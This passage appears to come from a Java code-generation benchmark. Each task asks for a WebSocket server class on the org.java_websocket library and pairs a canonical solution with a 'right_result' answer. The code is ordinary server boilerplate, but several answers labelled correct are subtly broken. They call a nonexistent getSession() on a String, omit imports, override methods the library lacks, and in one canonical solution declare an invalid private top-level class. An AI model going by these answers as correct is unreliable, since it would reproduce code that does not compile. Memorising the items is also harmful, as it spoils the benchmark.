    "Instruction": "Task Description: Implement a WebSocket server class that handles client connections, messages, and disconnections using the org.java_websocket library.\n\nClass Description: The SocketActivation class extends WebSocketServer to create a custom WebSocket server. It manages client connections, broadcasts messages to all connected clients, and handles server lifecycle events. The server tracks the number of connected clients and shuts down when no clients remain.\n\nAttributes:\n- clients: AtomicInteger - Tracks the number of currently connected clients\n\nMethods:\n- SocketActivation(ServerSocketChannel chan) -> None - Constructor that initializes the WebSocket server with the given ServerSocketChannel\n- onOpen(WebSocket conn, ClientHandshake handshake) -> None - Handles new client connections, sends welcome message, and broadcasts connection event\n- onClose(WebSocket conn, int code, String reason, boolean remote) -> None - Handles client disconnections, broadcasts departure event, and shuts down server if no clients remain\n- onMessage(WebSocket conn, String message) -> None - Broadcasts received text messages to all clients and logs the message\n- onMessage(WebSocket conn, ByteBuffer message) -> None - Broadcasts received binary messages to all clients and logs the message\n- onError(WebSocket conn, Exception ex) -> None - Handles and logs any errors that occur during WebSocket operations\n- onStart() -> None - Called when the server starts successfully, logs server startup",
    "Canonical_solution": "import java.io.IOException;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.ServerSocketChannel;\nimport java.util.concurrent.atomic.AtomicInteger;\nimport org.java_websocket.WebSocket;\nimport org.java_websocket.handshake.ClientHandshake;\nimport org.java_websocket.server.WebSocketServer;\n\npublic class SocketActivation extends WebSocketServer {\n\n    private AtomicInteger clients = new AtomicInteger(0);\n\n    public SocketActivation(ServerSocketChannel chan) {\n        super(chan);\n    }\n\n    @Override\n    public void onOpen(WebSocket conn, ClientHandshake handshake) {\n        conn.send(\"Welcome to the server!\");\n        broadcast(\"new connection: \" + handshake.getResourceDescriptor());\n        if(clients.get() == 0) {\n            broadcast(\"You are the first client to join\");\n        }\n        System.out.println(conn.getRemoteSocketAddress().getAddress().getHostAddress() + \" entered the room!\");\n        clients.incrementAndGet();\n    }\n\n    @Override\n    public void onClose(WebSocket conn, int code, String reason, boolean remote) {\n        broadcast(conn + \" has left the room!\");\n        System.out.println(conn + \" has left the room!\");\n        if(clients.decrementAndGet() <= 0) {\n            System.out.println(\"No more clients left, exiting\");\n            System.exit(0);\n        }\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, String message) {\n        broadcast(message);\n        System.out.println(conn + \": \" + message);\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, ByteBuffer message) {\n        broadcast(message.array());\n        System.out.println(conn + \": \" + message);\n    }\n\n    @Override\n    public void onError(WebSocket conn, Exception ex) {\n        ex.printStackTrace();\n    }\n\n    @Override\n    public void onStart() {\n        System.out.println(\"Server started!\");\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 28,
    "right_result": "```java\nimport org.java_websocket.WebSocket;\nimport org.java_websocket.handshake.ClientHandshake;\nimport org.java_websocket.server.WebSocketServer;\nimport java.io.IOException;\nimport java.net.InetSocketAddress;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.ServerSocketChannel;\nimport java.util.concurrent.atomic.AtomicInteger;\n\npublic class SocketActivation extends WebSocketServer {\n    private final AtomicInteger clients = new AtomicInteger(0);\n\n    public SocketActivation(ServerSocketChannel chan) {\n        super((InetSocketAddress) chan.socket().getLocalSocketAddress());\n    }\n\n    @Override\n    public void onOpen(WebSocket conn, ClientHandshake handshake) {\n        clients.incrementAndGet();\n        String welcomeMessage = \"Welcome to the WebSocket server!\";\n        conn.send(welcomeMessage);\n        broadcast(\"New client connected. Total clients: \" + clients.get());\n    }\n\n    @Override\n    public void onClose(WebSocket conn, int code, String reason, boolean remote) {\n        clients.decrementAndGet();\n        broadcast(\"Client disconnected. Reason: \" + reason + \". Total clients: \" + clients.get());\n        if (clients.get() == 0) {\n            stop();\n        }\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, String message) {\n        System.out.println(\"Received text message: \" + message);\n        broadcast(\"Text message received: \" + message);\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, ByteBuffer message) {\n        byte[] bytes = new byte[message.remaining()];\n        message.get(bytes);\n        System.out.println(\"Received binary message of length: \" + bytes.length);\n        for (WebSocket client : getConnections()) {\n            client.send(message);\n        }\n    }\n\n    @Override\n    public void onError(WebSocket conn, Exception ex) {\n        ex.printStackTrace();\n    }\n\n    @Override\n    public void onStart() {\n        System.out.println(\"WebSocket server started successfully on port: \" + getPort());\n    }\n}\n```"
  },
  {
    "Task_id": 474,
    "Instruction": "Task Description: Implement a WebSocket server class that handles client connections, messages, and disconnections using the org.java_websocket library. The server should assign unique IDs to clients and log connection events.\n\nClass Description: ChatServerAttachmentExample is a WebSocket server implementation that manages client connections, tracks clients with unique IDs, and handles text/binary messages. It extends WebSocketServer from the org.java_websocket library.\n\nAttributes:\n- index: Integer - Tracks the next available client ID to be assigned\n\nMethods:\n- Constructor(port: int) -> None - Creates server instance bound to specified port\n- Constructor(address: InetSocketAddress) -> None - Creates server instance bound to specified address\n- onOpen(conn: WebSocket, handshake: ClientHandshake) -> void - Handles new client connections, assigns ID\n- onClose(conn: WebSocket, code: int, reason: String, remote: boolean) -> void - Handles client disconnections\n- onMessage(conn: WebSocket, message: String) -> void - Processes text messages from clients\n- onMessage(conn: WebSocket, message: ByteBuffer) -> void - Processes binary messages from clients\n- onError(conn: WebSocket, ex: Exception) -> void - Handles connection errors\n- onStart() -> void - Called when server starts successfully",
    "Canonical_solution": "import java.io.BufferedReader;\nimport java.io.IOException;\nimport java.io.InputStreamReader;\nimport java.net.InetSocketAddress;\nimport java.net.UnknownHostException;\nimport java.nio.ByteBuffer;\nimport org.java_websocket.WebSocket;\nimport org.java_websocket.handshake.ClientHandshake;\nimport org.java_websocket.server.WebSocketServer;\n\npublic class ChatServerAttachmentExample extends WebSocketServer {\n\n    Integer index = 0;\n\n    public ChatServerAttachmentExample(int port) throws UnknownHostException {\n        super(new InetSocketAddress(port));\n    }\n\n    public ChatServerAttachmentExample(InetSocketAddress address) {\n        super(address);\n    }\n\n    @Override\n    public void onOpen(WebSocket conn, ClientHandshake handshake) {\n        conn.setAttachment(index);\n        index++;\n        System.out.println(\n            conn.getRemoteSocketAddress().getAddress().getHostAddress() + \" entered the room! ID: \"\n                + conn.<Integer>getAttachment());\n    }\n\n    @Override\n    public void onClose(WebSocket conn, int code, String reason, boolean remote) {\n        System.out.println(conn + \" has left the room! ID: \" + conn.<Integer>getAttachment());\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, String message) {\n        System.out.println(conn + \": \" + message);\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, ByteBuffer message) {\n        System.out.println(conn + \": \" + message);\n    }\n\n    @Override\n    public void onError(WebSocket conn, Exception ex) {\n        ex.printStackTrace();\n    }\n\n    @Override\n    public void onStart() {\n        System.out.println(\"Server started!\");\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 28,
    "right_result": "import org.java_websocket.WebSocket;\nimport org.java_websocket.handshake.ClientHandshake;\nimport org.java_websocket.server.WebSocketServer;\n\nimport java.net.InetSocketAddress;\nimport java.nio.ByteBuffer;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class ChatServerAttachmentExample extends WebSocketServer {\n    private int index = 0;\n    private final Map<WebSocket, Integer> clientIds = new HashMap<>();\n\n    public ChatServerAttachmentExample(int port) {\n        super(new InetSocketAddress(port));\n    }\n\n    public ChatServerAttachmentExample(InetSocketAddress address) {\n        super(address);\n    }\n\n    @Override\n    public void onOpen(WebSocket conn, ClientHandshake handshake) {\n        int clientId = index++;\n        clientIds.put(conn, clientId);\n        System.out.println(\"New connection with ID: \" + clientId);\n    }\n\n    @Override\n    public void onClose(WebSocket conn, int code, String reason, boolean remote) {\n        int clientId = clientIds.remove(conn);\n        System.out.println(\"Connection closed for ID: \" + clientId);\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, String message) {\n        System.out.println(\"Received text message from ID \" + clientIds.get(conn) + \": \" + message);\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, ByteBuffer message) {\n        byte[] bytes = new byte[message.remaining()];\n        message.get(bytes);\n        System.out.println(\"Received binary message from ID \" + clientIds.get(conn) + \": \" + new String(bytes));\n    }\n\n    @Override\n    public void onError(WebSocket conn, Exception ex) {\n        ex.printStackTrace();\n    }\n\n    @Override\n    public void onStart() {\n        System.out.println(\"Server started successfully\");\n    }\n}"
  },
  {
    "Task_id": 475,
    "Instruction": "Task Description: Implement a WebSocket server class in Java using the org.java_websocket library to handle client connections, messages, disconnections, and errors.\n\nClass Description: The WSocketServer class extends WebSocketServer to create a custom WebSocket server that manages client connections and communication. It handles lifecycle events including connection opening, message reception, connection closing, and errors. The server can broadcast messages to all connected clients.\n\nAttributes:\n- Inherited attributes from WebSocketServer (base class handles socket connections and client management)\n\nMethods:\n- Constructor: WSocketServer(int port) throws UnknownHostException - Creates a server instance bound to the specified port.\n- Constructor: WSocketServer(InetSocketAddress address) - Creates a server instance bound to the specified socket address.\n- onOpen: onOpen(WebSocket conn, ClientHandshake handshake) -> void - Handles new client connections and sends a handshake confirmation.\n- onClose: onClose(WebSocket conn, int code, String reason, boolean remote) -> void - Handles client disconnections and notifies other clients.\n- onMessage: onMessage(WebSocket conn, String message) -> void - Processes incoming messages from clients and echoes them back.\n- onError: onError(WebSocket conn, Exception ex) -> void - Handles errors occurring during WebSocket operations.\n- sendToClient: sendToClient(String text) -> void - Broadcasts a message to all connected clients (thread-safe operation).",
    "Canonical_solution": "import org.java_websocket.WebSocket;\nimport org.java_websocket.handshake.ClientHandshake;\nimport org.java_websocket.server.WebSocketServer;\nimport java.net.InetSocketAddress;\nimport java.net.UnknownHostException;\nimport java.util.Collection;\n\npublic class WSocketServer extends WebSocketServer {\n\n    public WSocketServer(int port) throws UnknownHostException {\n        super(new InetSocketAddress(port));\n    }\n\n    public WSocketServer(InetSocketAddress address) {\n        super(address);\n    }\n\n    @Override\n    public void onOpen(WebSocket webSocket, ClientHandshake clientHandshake) {\n        this.sendToClient(\"[Handshake Ok]\");\n    }\n\n    @Override\n    public void onClose(WebSocket webSocket, int i, String s, boolean b) {\n        this.sendToClient(webSocket + \" close\");\n    }\n\n    @Override\n    public void onMessage(WebSocket webSocket, String message) {\n        this.sendToClient(message);\n    }\n\n    @Override\n    public void onError(WebSocket webSocket, Exception e) {\n        e.printStackTrace();\n        if (webSocket != null) {\n            // Error handling for specific WebSocket\n        }\n    }\n\n    public void sendToClient(String text) {\n        Collection<WebSocket> con = connections();\n        synchronized (con) {\n            for (WebSocket c : con) {\n                c.send(text);\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 28,
    "right_result": "```java\nimport org.java_websocket.WebSocket;\nimport org.java_websocket.handshake.ClientHandshake;\nimport org.java_websocket.server.WebSocketServer;\n\nimport java.net.InetSocketAddress;\nimport java.net.UnknownHostException;\nimport java.util.concurrent.CopyOnWriteArrayList;\n\npublic class WSocketServer extends WebSocketServer {\n    private final CopyOnWriteArrayList<WebSocket> connections = new CopyOnWriteArrayList<>();\n\n    public WSocketServer(int port) throws UnknownHostException {\n        super(new InetSocketAddress(port));\n    }\n\n    public WSocketServer(InetSocketAddress address) {\n        super(address);\n    }\n\n    @Override\n    public void onOpen(WebSocket conn, ClientHandshake handshake) {\n        connections.add(conn);\n        sendToClient(\"New client connected: \" + conn.getRemoteSocketAddress());\n    }\n\n    @Override\n    public void onClose(WebSocket conn, int code, String reason, boolean remote) {\n        connections.remove(conn);\n        sendToClient(\"Client disconnected: \" + conn.getRemoteSocketAddress() + \", Reason: \" + reason);\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, String message) {\n        sendToClient(\"Received from \" + conn.getRemoteSocketAddress() + \": \" + message);\n        conn.send(\"Echo: \" + message);\n    }\n\n    @Override\n    public void onError(WebSocket conn, Exception ex) {\n        ex.printStackTrace();\n        if (conn != null) {\n            connections.remove(conn);\n        }\n    }\n\n    public void sendToClient(String text) {\n        for (WebSocket conn : connections) {\n            conn.send(text);\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 476,
    "Instruction": "Task Description: Create a WebSocket server class that handles client connections, messages, and disconnections using the org.java_websocket library. The server should echo received messages back to clients and maintain a connection counter.\n\nClass Description: AutobahnSSLServerTest is a WebSocket server implementation that extends WebSocketServer from the org.java_websocket library. It handles client connections by maintaining a counter, processes incoming messages by echoing them back, and provides basic connection lifecycle management.\n\nAttributes:\n- counter: [int] - Static counter tracking the number of opened connections\n\nMethods:\n- Constructor: [AutobahnSSLServerTest](int port, Draft d) -> [void] - Creates a server instance bound to the specified port using the given WebSocket draft protocol\n- Constructor: [AutobahnSSLServerTest](InetSocketAddress address, Draft d) -> [void] - Creates a server instance bound to the specified address using the given WebSocket draft protocol\n- onOpen: [onOpen](WebSocket conn, ClientHandshake handshake) -> [void] - Handles new client connections, increments connection counter\n- onClose: [onClose](WebSocket conn, int code, String reason, boolean remote) -> [void] - Handles client disconnections\n- onError: [onError](WebSocket conn, Exception ex) -> [void] - Handles connection errors\n- onStart: [onStart]() -> [void] - Called when server starts successfully\n- onMessage: [onMessage](WebSocket conn, String message) -> [void] - Echoes received text messages back to the client\n- onMessage: [onMessage](WebSocket conn, ByteBuffer blob) -> [void] - Echoes received binary messages back to the client",
    "Canonical_solution": "import java.net.InetSocketAddress;\nimport java.net.UnknownHostException;\nimport java.nio.ByteBuffer;\nimport java.util.Collections;\nimport org.java_websocket.WebSocket;\nimport org.java_websocket.drafts.Draft;\nimport org.java_websocket.drafts.Draft_6455;\nimport org.java_websocket.handshake.ClientHandshake;\nimport org.java_websocket.server.WebSocketServer;\n\npublic class AutobahnSSLServerTest extends WebSocketServer {\n\n    private static int counter = 0;\n\n    public AutobahnSSLServerTest(int port, Draft d) throws UnknownHostException {\n        super(new InetSocketAddress(port), Collections.singletonList(d));\n    }\n\n    public AutobahnSSLServerTest(InetSocketAddress address, Draft d) {\n        super(address, Collections.singletonList(d));\n    }\n\n    @Override\n    public void onOpen(WebSocket conn, ClientHandshake handshake) {\n        counter++;\n        System.out.println(\"///////////Opened connection number\" + counter);\n    }\n\n    @Override\n    public void onClose(WebSocket conn, int code, String reason, boolean remote) {\n        System.out.println(\"closed\");\n    }\n\n    @Override\n    public void onError(WebSocket conn, Exception ex) {\n        System.out.println(\"Error:\");\n        ex.printStackTrace();\n    }\n\n    @Override\n    public void onStart() {\n        System.out.println(\"Server started!\");\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, String message) {\n        conn.send(message);\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, ByteBuffer blob) {\n        conn.send(blob);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 28,
    "right_result": "```java\nimport org.java_websocket.WebSocket;\nimport org.java_websocket.handshake.ClientHandshake;\nimport org.java_websocket.server.WebSocketServer;\nimport java.net.InetSocketAddress;\nimport java.nio.ByteBuffer;\n\npublic class AutobahnSSLServerTest extends WebSocketServer {\n    private static int counter = 0;\n\n    public AutobahnSSLServerTest(int port, Draft d) {\n        super(new InetSocketAddress(port), d);\n    }\n\n    public AutobahnSSLServerTest(InetSocketAddress address, Draft d) {\n        super(address, d);\n    }\n\n    @Override\n    public void onOpen(WebSocket conn, ClientHandshake handshake) {\n        counter++;\n        System.out.println(\"New connection opened. Total connections: \" + counter);\n    }\n\n    @Override\n    public void onClose(WebSocket conn, int code, String reason, boolean remote) {\n        counter--;\n        System.out.println(\"Connection closed. Reason: \" + reason + \". Total connections: \" + counter);\n    }\n\n    @Override\n    public void onError(WebSocket conn, Exception ex) {\n        ex.printStackTrace();\n        if (conn != null) {\n            conn.close();\n        }\n    }\n\n    @Override\n    public void onStart() {\n        System.out.println(\"Server started successfully.\");\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, String message) {\n        conn.send(message);\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, ByteBuffer blob) {\n        conn.send(blob);\n    }\n}\n```"
  },
  {
    "Task_id": 477,
    "Instruction": "Task Description: Create a WebSocket server implementation using the org.java_websocket library to handle real-time bidirectional communication between clients and the server.\n\nClass Description: MyWebSocketServer is a custom WebSocket server implementation that extends WebSocketServer from the org.java_websocket library. It handles client connections, message processing, disconnections, and error scenarios in a WebSocket communication environment.\n\nAttributes:\nNone explicitly declared in this implementation (inherits attributes from WebSocketServer parent class)\n\nMethods:\n1. onOpen(WebSocket conn, ClientHandshake handshake) -> void - Called when a new client connects to the server\n   - conn: WebSocket - The client connection object\n   - handshake: ClientHandshake - The handshake data from the client\n\n2. onClose(WebSocket conn, int code, String reason, boolean remote) -> void - Called when a client disconnects from the server\n   - conn: WebSocket - The client connection object\n   - code: int - The status code for disconnection\n   - reason: String - The reason for disconnection\n   - remote: boolean - Whether the disconnection was initiated by the remote host\n\n3. onMessage(WebSocket conn, String message) -> void - Called when a message is received from a client\n   - conn: WebSocket - The client connection object\n   - message: String - The received message content\n\n4. onError(WebSocket conn, Exception ex) -> void - Called when an error occurs\n   - conn: WebSocket - The client connection object (may be null if error isn't associated with a specific connection)\n   - ex: Exception - The exception that occurred\n\n5. onStart() -> void - Called when the server starts successfully\n\n6. LocalWebSocketFactory (nested class) - Implements WebSocketServerFactory for custom WebSocket creation\n   Methods:\n   a. createWebSocket(WebSocketAdapter a, Draft d) -> WebSocketImpl\n   b. createWebSocket(WebSocketAdapter a, List<Draft> drafts) -> WebSocketImpl\n   c. wrapChannel(SocketChannel channel, SelectionKey key) -> ByteChannel\n   d. close() -> void",
    "Canonical_solution": "import java.io.IOException;\nimport java.nio.channels.ByteChannel;\nimport java.nio.channels.SelectionKey;\nimport java.nio.channels.SocketChannel;\nimport java.util.List;\nimport org.java_websocket.WebSocket;\nimport org.java_websocket.WebSocketAdapter;\nimport org.java_websocket.WebSocketImpl;\nimport org.java_websocket.WebSocketServerFactory;\nimport org.java_websocket.drafts.Draft;\nimport org.java_websocket.handshake.ClientHandshake;\nimport org.java_websocket.server.WebSocketServer;\n\npublic class MyWebSocketServer extends WebSocketServer {\n\n    @Override\n    public void onOpen(WebSocket conn, ClientHandshake handshake) {\n        // Handle new client connection\n    }\n\n    @Override\n    public void onClose(WebSocket conn, int code, String reason, boolean remote) {\n        // Handle client disconnection\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, String message) {\n        // Process received message\n    }\n\n    @Override\n    public void onError(WebSocket conn, Exception ex) {\n        // Handle errors\n    }\n\n    @Override\n    public void onStart() {\n        // Server startup logic\n    }\n}\n\nprivate class LocalWebSocketFactory implements WebSocketServerFactory {\n\n    @Override\n    public WebSocketImpl createWebSocket(WebSocketAdapter a, Draft d) {\n        return null;\n    }\n\n    @Override\n    public WebSocketImpl createWebSocket(WebSocketAdapter a, List<Draft> drafts) {\n        return null;\n    }\n\n    @Override\n    public ByteChannel wrapChannel(SocketChannel channel, SelectionKey key) throws IOException {\n        return null;\n    }\n\n    @Override\n    public void close() {\n        // Cleanup resources\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 28,
    "right_result": "```java\nimport org.java_websocket.WebSocket;\nimport org.java_websocket.handshake.ClientHandshake;\nimport org.java_websocket.server.WebSocketServer;\nimport org.java_websocket.drafts.Draft;\nimport org.java_websocket.exceptions.InvalidDataException;\nimport org.java_websocket.framing.Framedata;\n\nimport java.io.IOException;\nimport java.net.InetSocketAddress;\nimport java.nio.channels.ByteChannel;\nimport java.nio.channels.SelectionKey;\nimport java.nio.channels.SocketChannel;\nimport java.util.List;\nimport java.util.concurrent.CopyOnWriteArraySet;\n\npublic class MyWebSocketServer extends WebSocketServer {\n\n    public MyWebSocketServer(InetSocketAddress address) {\n        super(address);\n    }\n\n    @Override\n    public void onOpen(WebSocket conn, ClientHandshake handshake) {\n        System.out.println(\"New connection from \" + conn.getRemoteSocketAddress());\n    }\n\n    @Override\n    public void onClose(WebSocket conn, int code, String reason, boolean remote) {\n        System.out.println(\"Closed connection to \" + conn.getRemoteSocketAddress() + \" with code \" + code + \" and reason: \" + reason);\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, String message) {\n        System.out.println(\"Received message from \" + conn.getRemoteSocketAddress() + \": \" + message);\n        try {\n            conn.send(\"Echo: \" + message);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, byte[] bytes) {\n        System.out.println(\"Received binary message from \" + conn.getRemoteSocketAddress());\n    }\n\n    @Override\n    public void onFragment(WebSocket conn, Framedata fragment) {\n        System.out.println(\"Received fragment from \" + conn.getRemoteSocketAddress());\n    }\n\n    @Override\n    public void onError(WebSocket conn, Exception ex) {\n        ex.printStackTrace();\n        if (conn != null) {\n            conn.close();\n        }\n    }\n\n    @Override\n    public void onStart() {\n        System.out.println(\"WebSocket server started successfully.\");\n    }\n\n    public static class LocalWebSocketFactory implements WebSocketServerFactory {\n\n        @Override\n        public WebSocketImpl createWebSocket(WebSocketAdapter a, Draft d) {\n            return new WebSocketImpl(a, d);\n        }\n\n        @Override\n        public WebSocketImpl createWebSocket(WebSocketAdapter a, List<Draft> drafts) {\n            return new WebSocketImpl(a, drafts);\n        }\n\n        @Override\n        public ByteChannel wrapChannel(SocketChannel channel, SelectionKey key) {\n            return channel;\n        }\n\n        @Override\n        public void close() {\n            // No resources to close here\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 478,
    "Instruction": "Task Description: Create a WebSocket server class that handles client connections, messages, and disconnections using the org.java_websocket library. The server should also track SSL support and session information for testing purposes.\n\nClass Description: MyWebSocketServer is a custom WebSocket server implementation that extends the WebSocketServer class from the org.java_websocket library. It manages client connections, processes incoming messages, handles disconnections, and tracks SSL-related information for testing. The server notifies when it starts successfully via a CountDownLatch.\n\nAttributes:\n- testResult: [TestResult] - Stores test-related information including SSL support status and SSL session\n- countServerDownLatch: [CountDownLatch] - Used to signal when the server has successfully started\n\nMethods:\n- MyWebSocketServer([int port, TestResult testResult, CountDownLatch countServerDownLatch]) -> [void] - Constructor that initializes the server with specified port, test result object, and countdown latch\n- onOpen([WebSocket conn, ClientHandshake handshake]) -> [void] - Called when a new client connects; checks for SSL support and stores SSL session\n- onClose([WebSocket conn, int code, String reason, boolean remote]) -> [void] - Called when a client disconnects\n- onMessage([WebSocket conn, String message]) -> [void] - Called when a message is received from a client\n- onError([WebSocket conn, Exception ex]) -> [void] - Called when an error occurs; prints stack trace\n- onStart() -> [void] - Called when the server starts successfully; decrements the countdown latch",
    "Canonical_solution": "import java.net.InetSocketAddress;\nimport javax.net.ssl.SSLSession;\nimport org.java_websocket.WebSocket;\nimport org.java_websocket.handshake.ClientHandshake;\nimport org.java_websocket.server.WebSocketServer;\n\npublic class MyWebSocketServer extends WebSocketServer {\n\n    private final TestResult testResult;\n    private final CountDownLatch countServerDownLatch;\n\n    public MyWebSocketServer(int port, TestResult testResult, CountDownLatch countServerDownLatch) {\n        super(new InetSocketAddress(port));\n        this.testResult = testResult;\n        this.countServerDownLatch = countServerDownLatch;\n    }\n\n    @Override\n    public void onOpen(WebSocket conn, ClientHandshake handshake) {\n        testResult.hasSSLSupport = conn.hasSSLSupport();\n        try {\n            testResult.sslSession = conn.getSSLSession();\n        } catch (IllegalArgumentException e) {\n            // Ignore\n        }\n    }\n\n    @Override\n    public void onClose(WebSocket conn, int code, String reason, boolean remote) {\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, String message) {\n    }\n\n    @Override\n    public void onError(WebSocket conn, Exception ex) {\n        ex.printStackTrace();\n    }\n\n    @Override\n    public void onStart() {\n        countServerDownLatch.countDown();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 28,
    "right_result": "```java\nimport org.java_websocket.WebSocket;\nimport org.java_websocket.handshake.ClientHandshake;\nimport org.java_websocket.server.WebSocketServer;\nimport javax.net.ssl.SSLSession;\nimport java.net.InetSocketAddress;\nimport java.util.concurrent.CountDownLatch;\n\npublic class MyWebSocketServer extends WebSocketServer {\n    private final TestResult testResult;\n    private final CountDownLatch countServerDownLatch;\n\n    public MyWebSocketServer(int port, TestResult testResult, CountDownLatch countServerDownLatch) {\n        super(new InetSocketAddress(port));\n        this.testResult = testResult;\n        this.countServerDownLatch = countServerDownLatch;\n    }\n\n    @Override\n    public void onOpen(WebSocket conn, ClientHandshake handshake) {\n        SSLSession sslSession = (SSLSession) handshake.getResourceDescriptor().getSession();\n        if (sslSession != null) {\n            testResult.setSslSupported(true);\n            testResult.setSslSession(sslSession);\n        } else {\n            testResult.setSslSupported(false);\n        }\n    }\n\n    @Override\n    public void onClose(WebSocket conn, int code, String reason, boolean remote) {\n        // Handle client disconnection\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, String message) {\n        // Handle incoming messages\n    }\n\n    @Override\n    public void onError(WebSocket conn, Exception ex) {\n        ex.printStackTrace();\n    }\n\n    @Override\n    public void onStart() {\n        countServerDownLatch.countDown();\n    }\n}\n```"
  },
  {
    "Task_id": 479,
    "Instruction": "Task Description: Create a WebSocket server implementation using the org.java_websocket library that handles client connections, messages, and disconnections, with configurable connection limits and support for different WebSocket drafts.\n\nClass Description: AutobahnServerTest is a WebSocket server implementation that extends WebSocketServer from the org.java_websocket library. It manages client connections, processes incoming messages (both text and binary), tracks connection statistics, and supports graceful shutdown when reaching a configured connection limit.\n\nAttributes:\n- openCounter: [static int] - Tracks total number of opened connections\n- closeCounter: [static int] - Tracks total number of closed connections\n- limit: [int] - Maximum number of connections before server shutdown\n\nMethods:\n- Constructor: [AutobahnServerTest]([int port, int limit, Draft d]) -> [void] - Creates server instance with specified port, connection limit, and WebSocket draft\n- Constructor: [AutobahnServerTest]([InetSocketAddress address, Draft d]) -> [void] - Creates server instance with specified address and WebSocket draft\n- onOpen: [void]([WebSocket conn, ClientHandshake handshake]) -> [void] - Handles new client connections, increments openCounter\n- onClose: [void]([WebSocket conn, int code, String reason, boolean remote]) -> [void] - Handles client disconnections, increments closeCounter, shuts down server if limit reached\n- onError: [void]([WebSocket conn, Exception ex]) -> [void] - Handles connection errors, prints stack trace\n- onStart: [void]() -> [void] - Called when server starts, prints startup message\n- onMessage: [void]([WebSocket conn, String message]) -> [void] - Handles text messages, echoes back to client\n- onMessage: [void]([WebSocket conn, ByteBuffer blob]) -> [void] - Handles binary messages, echoes back to client",
    "Canonical_solution": "import java.net.InetSocketAddress;\nimport java.net.UnknownHostException;\nimport java.nio.ByteBuffer;\nimport java.util.Collections;\nimport org.java_websocket.WebSocket;\nimport org.java_websocket.drafts.Draft;\nimport org.java_websocket.drafts.Draft_6455;\nimport org.java_websocket.extensions.permessage_deflate.PerMessageDeflateExtension;\nimport org.java_websocket.handshake.ClientHandshake;\nimport org.java_websocket.server.WebSocketServer;\n\npublic class AutobahnServerTest extends WebSocketServer {\n\n    private static int openCounter = 0;\n    private static int closeCounter = 0;\n    private int limit = Integer.MAX_VALUE;\n\n    public AutobahnServerTest(int port, int limit, Draft d) throws UnknownHostException {\n        super(new InetSocketAddress(port), Collections.singletonList(d));\n        this.limit = limit;\n    }\n\n    public AutobahnServerTest(InetSocketAddress address, Draft d) {\n        super(address, Collections.singletonList(d));\n    }\n\n    @Override\n    public void onOpen(WebSocket conn, ClientHandshake handshake) {\n        openCounter++;\n        System.out.println(\"///////////Opened connection number\" + openCounter);\n    }\n\n    @Override\n    public void onClose(WebSocket conn, int code, String reason, boolean remote) {\n        closeCounter++;\n        System.out.println(\"closed\");\n        if (closeCounter >= limit) {\n            System.exit(0);\n        }\n    }\n\n    @Override\n    public void onError(WebSocket conn, Exception ex) {\n        System.out.println(\"Error:\");\n        ex.printStackTrace();\n    }\n\n    @Override\n    public void onStart() {\n        System.out.println(\"Server started!\");\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, String message) {\n        conn.send(message);\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, ByteBuffer blob) {\n        conn.send(blob);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 28,
    "right_result": "```java\nimport org.java_websocket.WebSocket;\nimport org.java_websocket.handshake.ClientHandshake;\nimport org.java_websocket.server.WebSocketServer;\n\nimport java.net.InetSocketAddress;\nimport java.nio.ByteBuffer;\n\npublic class AutobahnServerTest extends WebSocketServer {\n    private static int openCounter = 0;\n    private static int closeCounter = 0;\n    private final int limit;\n\n    public AutobahnServerTest(int port, int limit, Draft d) {\n        super(new InetSocketAddress(port), d);\n        this.limit = limit;\n    }\n\n    public AutobahnServerTest(InetSocketAddress address, Draft d) {\n        super(address, d);\n        this.limit = Integer.MAX_VALUE;\n    }\n\n    @Override\n    public void onOpen(WebSocket conn, ClientHandshake handshake) {\n        openCounter++;\n        System.out.println(\"New connection opened. Total connections: \" + openCounter);\n    }\n\n    @Override\n    public void onClose(WebSocket conn, int code, String reason, boolean remote) {\n        closeCounter++;\n        System.out.println(\"Connection closed. Total closed connections: \" + closeCounter);\n        if (openCounter <= closeCounter && closeCounter >= limit) {\n            stop();\n        }\n    }\n\n    @Override\n    public void onError(WebSocket conn, Exception ex) {\n        ex.printStackTrace();\n    }\n\n    @Override\n    public void onStart() {\n        System.out.println(\"Server started successfully.\");\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, String message) {\n        conn.send(message);\n    }\n\n    @Override\n    public void onMessage(WebSocket conn, ByteBuffer blob) {\n        byte[] array = new byte[blob.remaining()];\n        blob.get(array);\n        conn.send(ByteBuffer.wrap(array));\n    }\n}\n```"
  },
  {
    "Task_id": 48,
